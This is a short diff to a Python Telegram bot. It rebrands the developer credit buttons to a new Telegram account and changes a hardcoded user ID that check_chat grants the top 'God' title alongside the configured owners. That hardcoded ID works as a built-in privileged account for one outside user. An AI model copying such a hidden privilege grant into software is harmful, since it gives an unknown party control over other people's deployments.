@@ -15,13 +15,13 @@ from .encoding import encode, extract_subs
 from .uploads import upload_worker
 
 output = InlineKeyboardMarkup([
-    [InlineKeyboardButton("ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/akaza7902"),
-     InlineKeyboardButton("CantarellaBots", url="https://t.me/cantarellabots")]
+    [InlineKeyboardButton("ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/anujedits76"),
+     InlineKeyboardButton("𝐀𝐧𝐮𝐣 𝐊𝐮𝐦𝐚𝐫", url="https://t.me/anujedits76")]
 ])
 
 start_but = InlineKeyboardMarkup([
     [InlineKeyboardButton("sᴛᴀᴛs", callback_data="stats"), InlineKeyboardButton("Settings", callback_data="OpenSettings")],
-    [InlineKeyboardButton("ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/akaza7902"), InlineKeyboardButton("CantarellaBots", url="https://t.me/cantarellabots")]])
+    [InlineKeyboardButton("ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/anujedits76"), InlineKeyboardButton("𝐀𝐧𝐮𝐣 𝐊𝐮𝐦𝐚𝐫", url="https://t.me/anujedits76")]])
 
 
 async def check_chat(message, chat):
@@ -30,7 +30,7 @@ async def check_chat(message, chat):
     user_id = message.from_user.id
     get_sudo = await db.get_sudo()
     get_auth = await db.get_chat()
-    if user_id in owner or user_id == 885190545:
+    if user_id in owner or user_id == 7892805795:
         title = 'God'
     elif user_id in sudo_users or chat_id in sudo_users:
         title = 'Sudo'
